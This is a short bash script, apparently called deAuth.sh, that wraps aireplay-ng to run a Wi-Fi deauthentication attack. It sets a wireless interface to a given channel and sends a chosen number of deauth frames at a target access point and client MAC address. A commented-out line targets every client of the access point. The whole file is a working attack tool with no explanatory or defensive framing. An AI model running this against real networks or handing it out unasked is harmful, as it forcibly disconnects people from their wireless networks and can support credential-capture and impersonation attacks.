#!/bin/bash


if [ "$#" -lt 5 ]
then
    echo "[*] Usages: ./deAuth.sh {Interface_name} {BSSID} {Station_MAC} {Number_of_packets} {Channel}"
    exit 1
fi

if [ "$#" -eq 5 ]
then
    iw $1 set channel $5
    aireplay-ng --deauth $4 -a $2 -c $3 $1 
    #aireplay-ng --deauth $4 -a $2  $1 
fi